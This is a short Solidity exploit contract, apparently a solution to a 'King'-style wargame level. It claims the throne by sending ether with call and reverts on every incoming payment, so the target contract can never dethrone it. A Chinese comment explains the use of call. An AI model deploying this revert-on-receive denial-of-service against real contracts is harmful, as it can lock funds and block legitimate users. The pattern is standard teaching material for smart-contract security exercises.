// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Exp {
    function getKing(address payable addr) public payable {
        // 使用call，以防对面的接收函数实现了复杂逻辑
        (bool success, )= addr.call{value: 0.0011 ether}("");
        require(success, "Fail");
    }
    receive() external payable { 
        revert();
    }
}
